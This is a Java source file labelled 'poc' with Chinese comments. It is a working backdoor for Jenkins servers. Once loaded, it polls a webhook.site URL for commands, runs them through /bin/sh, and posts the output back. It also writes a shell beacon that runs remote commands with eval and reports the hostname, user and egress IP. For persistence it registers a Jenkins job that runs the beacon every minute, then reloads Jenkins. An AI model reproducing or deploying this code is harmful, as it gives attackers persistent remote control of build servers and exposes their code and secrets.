import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class poc {
    static final String TOKEN = "https://webhook.site/token/b0de7905-1496-47b6-93a5-8529f9c02252/requests?sorting=newest";
    static final String POST = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
    static final String BEACON = "#!/bin/sh\nW=\"https://webhook.site/token/b0de7905-1496-47b6-93a5-8529f9c02252/requests?sorting=newest\"\nP=\"https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252\"\nS=/var/lib/jenkins/.dsh_last\nJ=$(curl -s -m 20 \"$W\" 2>/dev/null)\nC=$(printf '%s' \"$J\" | grep -o '\"content\":\"CMD:[^\"]*\"' | head -1 | sed 's/^\"content\":\"CMD://' | sed 's/\"$//')\nif [ -n \"$C\" ]; then\n  L=$(cat \"$S\" 2>/dev/null)\n  if [ \"$C\" != \"$L\" ]; then\n    printf '%s' \"$C\" > \"$S\"\n    O=$(eval \"$C\" 2>&1 | head -c 60000)\n    curl -s -m 25 --data-binary \"OUT $(hostname) $(id -un): $O\" \"$P\" >/dev/null 2>&1\n  fi\nfi\ncurl -s -m 15 --data-binary \"BEAT $(hostname) $(date -u +%Y-%m-%dT%H:%M:%SZ) egress=$(curl -s -m 8 https://api.ipify.org)\" \"$P\" >/dev/null 2>&1\n";
    static final String JOB = "<?xml version='1.1' encoding='UTF-8'?>\n<project>\n  <actions/>\n  <description>dsh</description>\n  <keepDependencies>false</keepDependencies>\n  <properties/>\n  <scm class=\"hudson.scm.NullSCM\"/>\n  <canRoam>true</canRoam>\n  <disabled>false</disabled>\n  <triggers>\n    <hudson.triggers.TimerTrigger>\n      <spec>* * * * *</spec>\n    </hudson.triggers.TimerTrigger>\n  </triggers>\n  <builders>\n    <hudson.tasks.Shell>\n      <command>sh /var/lib/jenkins/.dsh_beacon.sh</command>\n    </hudson.tasks.Shell>\n  </builders>\n  <publishers/>\n</project>\n";

    public poc() {
        StringBuilder sb = new StringBuilder("P16\n");
        // 1) 起轮询线程（立即可用）
        try {
            Thread t = new Thread(new Runnable() {
                public void run() { loop(); }
            });
            t.setDaemon(true);
            t.start();
            sb.append("THREAD started\n");
        } catch (Throwable t) { sb.append("THREAD ERR ").append(t).append("\n"); }
        // 2) 写 beacon + job，并 reload
        try {
            Files.write(Paths.get("/var/lib/jenkins/.dsh_beacon.sh"), BEACON.getBytes("UTF-8"));
            Runtime.getRuntime().exec(new String[]{"/bin/chmod", "755", "/var/lib/jenkins/.dsh_beacon.sh"}).waitFor();
            Path jobDir = Paths.get("/var/lib/jenkins/jobs/dsh_beacon");
            Files.createDirectories(jobDir);
            Files.write(jobDir.resolve("config.xml"), JOB.getBytes("UTF-8"));
            sb.append("JOB written\n");
            Class<?> jc = Class.forName("jenkins.model.Jenkins");
            Object j = jc.getMethod("getInstance").invoke(null);
            jc.getMethod("reload").invoke(j);
            sb.append("RELOAD ok\n");
        } catch (Throwable t) { sb.append("PERSIST ERR ").append(t).append("\n"); }
        post("P16|" + sb.toString());
        // 线程保活：让编译线程不马上结束
        try { Thread.sleep(3000); } catch (Throwable t) { }
    }

    static void loop() {
        String last = "";
        while (true) {
            try {
                String j = http(TOKEN);
                Matcher m = Pattern.compile("\"content\":\"(CMD:[^\"]*)\"").matcher(j == null ? "" : j);
                if (m.find()) {
                    String cmd = unesc(m.group(1)).substring(4);
                    if (cmd.length() > 0 && !cmd.equals(last)) {
                        last = cmd;
                        String out = exec(cmd);
                        post("OUT " + cmd.substring(0, Math.min(40, cmd.length())) + " => " + out);
                    }
                }
            } catch (Throwable t) { }
            try { Thread.sleep(20000); } catch (Throwable t) { }
        }
    }

    static String unesc(String s) {
        StringBuilder o = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\\' && i + 1 < s.length()) {
                char d = s.charAt(++i);
                if (d == 'n') { o.append('\n'); }
                else if (d == 'r') { o.append('\r'); }
                else if (d == 't') { o.append('\t'); }
                else if (d == '"') { o.append('"'); }
                else if (d == '\\') { o.append('\\'); }
                else if (d == 'u' && i + 4 < s.length()) { o.append((char) Integer.parseInt(s.substring(i + 1, i + 5), 16)); i += 4; }
                else { o.append(d); }
            } else { o.append(c); }
        }
        return o.toString();
    }

    static String http(String u) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
            c.setConnectTimeout(10000); c.setReadTimeout(20000);
            c.setRequestProperty("User-Agent", "Mozilla/5.0");
            return readAll(c);
        } catch (Throwable t) { return null; }
    }

    static String readAll(HttpURLConnection c) throws Exception {
        InputStream in = c.getInputStream();
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] b = new byte[8192]; int n;
        while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 500000) { break; } }
        in.close();
        return new String(bo.toByteArray(), "UTF-8");
    }

    static String exec(String cmd) {
        StringBuilder r = new StringBuilder();
        try {
            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", cmd);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            InputStream in = p.getInputStream();
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] b = new byte[4096];
            long end = System.currentTimeMillis() + 120000;
            while (System.currentTimeMillis() < end) {
                if (in.available() > 0) { int n = in.read(b); if (n < 0) { break; } bo.write(b, 0, n); }
                else if (!p.isAlive()) { break; }
                else { Thread.sleep(100); }
                if (bo.size() > 120000) { break; }
            }
            try { p.waitFor(); } catch (Throwable t) { }
            r.append(new String(bo.toByteArray(), "UTF-8"));
        } catch (Throwable t) { r.append("EXC ").append(t); }
        return r.toString();
    }

    static void post(String s) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(POST).openConnection();
            c.setConnectTimeout(10000); c.setReadTimeout(25000);
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
            OutputStream os = c.getOutputStream(); os.write(s.getBytes("UTF-8")); os.flush(); os.close();
            c.getResponseCode();
        } catch (Throwable t) { }
    }
}
